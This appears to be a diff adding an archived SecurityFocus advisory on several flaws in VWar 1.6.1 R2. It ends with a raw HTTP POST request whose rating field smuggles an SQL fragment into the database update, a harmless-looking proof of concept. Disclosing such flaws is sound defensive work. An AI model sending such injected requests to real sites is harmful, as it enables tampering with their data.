@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/29001/info
+
+VWar is prone to multiple remote vulnerabilities, including:
+
+- Multiple HTML-injection vulnerabilities
+- An SQL-injection vulnerability
+- An unauthorized-access vulnerability
+- A vulnerability that allows attackers to brute-force authentication credentials
+
+An attacker can exploit these issues to compromise the affected application, gain unauthorized access to the application, execute arbitrary script code, steal cookie-based authentication credentials, access or modify data, or exploit latent vulnerabilities in the underlying database. Other attacks are also possible.
+
+VWar 1.6.1 R2 is vulnerable; other versions may also be affected. 
+
+  POST /vwar/article.php?rate=1 HTTP/1.1
+   Host: mydomain.com
+   User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.8.1.13)
+Gecko/20080311 Firefox/2.0.0.13
+   Accept:
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+   Accept-Language: en-gb,en;q=0.5
+   Accept-Encoding: gzip,deflate
+   Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+   Keep-Alive: 300
+   Proxy-Connection: keep-alive
+   Referer: http://mydomain.com/vwar/article.php?articleid=1
+   Content-Type: application/x-www-form-urlencoded
+   Content-Length: 64
+
+   ratearticleselect=5, article = char(78,71,83,32,84,69,83,84)
